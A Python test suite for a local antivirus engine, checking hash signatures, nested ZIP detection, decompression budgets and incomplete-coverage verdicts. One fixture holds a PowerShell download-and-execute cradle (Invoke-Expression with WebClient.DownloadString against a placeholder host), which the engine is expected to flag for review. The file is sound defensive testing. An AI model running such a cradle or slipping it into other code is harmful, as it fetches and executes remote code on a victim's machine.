"""Regression tests for the independent AntiOS detection engine."""
from __future__ import annotations

import hashlib
import io
import json
import tracemalloc
import zipfile

from antios import antivirus, engine
from antios.engine import AntiOSEngine


def _archive(entries, *, compression=zipfile.ZIP_DEFLATED):
    memory = io.BytesIO()
    with zipfile.ZipFile(memory, "w", compression=compression) as archive:
        for name, payload in entries.items():
            archive.writestr(name, payload)
    return memory.getvalue()


def test_native_mode_scans_without_clamav_or_amsi(tmp_path, monkeypatch):
    def external_provider_forbidden(*_args, **_kwargs):
        raise AssertionError("Native engine must not call third-party providers")

    monkeypatch.setattr(antivirus, "ClamAVScanner", external_provider_forbidden)
    monkeypatch.setattr(antivirus, "AmsiScanner", external_provider_forbidden)
    target = tmp_path / "benign"
    target.write_bytes(b"ordinary inert data")
    result = antivirus.scan_files(target, engine="antios")
    assert result["engine"]["provider"] == "AntiOS Engine"
    assert result["engine"]["database_freshness"] == "local"
    assert result["coverage"] == "antios-local-inspection"
    assert result["verdict"] == "no-threats-found"


def test_known_local_signature_is_confirmed_without_external_providers(tmp_path):
    target = tmp_path / "fixture"
    target.write_bytes(b"known inert local signature")
    digest = hashlib.sha256(target.read_bytes()).hexdigest()
    database = tmp_path / "signatures.json"
    database.write_text(json.dumps({
        "schema": 1, "sha256": {digest: "Inert test signature"},
    }))
    result = antivirus.scan_files(target, engine="antios", signature_path=database)
    assert result["verdict"] == "threats-found"
    assert result["summary"]["threats"] == 1
    assert result["findings"][0]["name"] == "Inert test signature"
    assert result["findings"][0]["sha256"] == digest


def test_known_signature_inside_zip_is_detected_and_archive_unchanged(tmp_path):
    payload = b"inert archive signature fixture"
    target = tmp_path / "archive.zip"
    target.write_bytes(_archive({"folder/payload.bin": payload}))
    original = target.read_bytes(), target.stat().st_mtime_ns
    database = tmp_path / "signatures.json"
    database.write_text(json.dumps({
        "schema": 1,
        "sha256": {hashlib.sha256(payload).hexdigest(): "Archive signature fixture"},
    }))
    result = antivirus.scan_files(target, engine="antios", signature_path=database)
    assert result["verdict"] == "threats-found"
    assert result["findings"][0]["engine"] == "AntiOS Engine"
    assert result["findings"][0]["name"] == "Archive signature fixture"
    assert (target.read_bytes(), target.stat().st_mtime_ns) == original


def test_nested_archive_signature_finds_member(tmp_path):
    payload = b"inert nested archive fixture"
    inner = _archive({"inside.exe": payload})
    target = tmp_path / "outer.zip"
    target.write_bytes(_archive({"nested.zip": inner}))
    database = tmp_path / "signatures.json"
    database.write_text(json.dumps({
        "schema": 1,
        "sha256": {hashlib.sha256(payload).hexdigest(): "Nested signature"},
    }))
    result = antivirus.scan_files(target, engine="antios", signature_path=database)
    assert result["verdict"] == "threats-found"
    assert result["findings"][0]["name"] == "Nested signature"


def test_suspicious_script_is_review_only_and_not_auto_enforceable(tmp_path):
    from antios.risk import evaluate_risk

    target = tmp_path / "test.ps1"
    target.write_bytes(b"invoke-expression (new-object net.webclient).downloadstring('example')")
    result = antivirus.scan_files(target, engine="antios")
    assert result["verdict"] == "review"
    assert result["findings"][0]["kind"] == "review"
    assert result["findings"][0]["engine"] == "AntiOS Engine"
    risk = evaluate_risk(str(target), result)
    assert not risk.automatic_enforcement_eligible


def test_unreadable_zip_does_not_report_clean(tmp_path):
    target = tmp_path / "damaged.zip"
    target.write_bytes(b"PK\x03\x04corrupt")
    result = antivirus.scan_files(target, engine="antios")
    assert result["verdict"] == "review"
    assert result["coverage"] == "limited"
    assert result["findings"][0]["kind"] == "review"


def test_archive_decompression_budget_is_bounded(tmp_path, monkeypatch):
    monkeypatch.setattr(engine, "MAX_ARCHIVE_MEMBER_BYTES", 10)
    target = tmp_path / "oversized.zip"
    target.write_bytes(_archive({"oversize.txt": b"x" * 100}))
    result = antivirus.scan_files(target, engine="antios")
    assert result["verdict"] == "review"
    assert result["coverage"] == "limited"


def test_large_stream_inspection_does_not_pretend_full_coverage(tmp_path):
    target = tmp_path / "large.bin"
    with target.open("wb") as stream:
        stream.truncate(33 * 1024 * 1024)
    result = antivirus.scan_files(target, engine="antios")
    assert result["summary"]["files_scanned"] == 1
    assert result["coverage"] == "limited"
    assert result["verdict"] == "incomplete"


def test_small_file_read_is_bounded_by_actual_size(tmp_path):
    target = tmp_path / "tiny"
    target.write_bytes(b"x" * 1024)
    tracemalloc.start()
    try:
        content, _info = antivirus.read_regular(target, 64 * 1024 * 1024)
        _current, peak = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()
    assert len(content) == 1024
    assert peak < 8 * 1024 * 1024


def test_native_engine_standalone_and_stream_boundary():
    native = AntiOSEngine(signatures={
        hashlib.sha256(b"fixture").hexdigest(): "Standalone fixture",
    })
    assert native.scan(b"fixture", "fixture.txt").kind == "threat"
    assert native.scan(b"ordinary", "ordinary.txt").kind is None
    assert not native.scan_stream([b"x" * (1024 * 1024 + 1)]).complete
    native.close()


def test_zip_magic_is_detected_without_zip_extension(tmp_path):
    payload = b"inert embedded-known-signature"
    target = tmp_path / "without-extension"
    target.write_bytes(_archive({"sample": payload}))
    database = tmp_path / "signatures.json"
    database.write_text(json.dumps({
        "schema": 1,
        "sha256": {hashlib.sha256(payload).hexdigest(): "Magic-based signature"},
    }))
    report = antivirus.scan_files(target, engine="antios", signature_path=database)
    assert report["verdict"] == "threats-found"
    assert report["findings"][0]["name"] == "Magic-based signature"


def test_invalid_portable_executable_is_review_only(tmp_path):
    target = tmp_path / "broken.exe"
    target.write_bytes(b"MZ" + bytes(70))
    report = antivirus.scan_files(target, engine="antios")
    assert report["verdict"] == "review"
    assert report["findings"][0]["engine"] == "AntiOS Engine"
